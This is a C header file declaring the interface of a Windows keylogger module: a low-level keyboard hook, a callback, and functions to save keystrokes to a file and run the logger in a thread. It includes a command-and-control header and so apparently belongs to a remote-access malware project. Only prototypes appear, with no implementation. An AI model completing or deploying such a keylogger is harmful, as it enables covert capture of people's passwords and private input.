#pragma once

#include <Windows.h>
#include "../CommandAndControl/CommandAndControl.h"

// Writes key_stroke to end of *file
int Save(int key_stroke, char *file);

// Callback to be run when a keystroke is pressed
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

// Sets the HookCallback for keystroke events on a WH_KEYBOARD_LL event
void SetHook();

// Releases the keylogger hook
void ReleaseHook();

// Worker thread for the keylogger
DWORD WINAPI LaunchKeylogger(LPVOID lpParam);

// Spins up the keylogger in a thread
void StartKeylogger();

// Stops the keylogger
void StopKeylogger();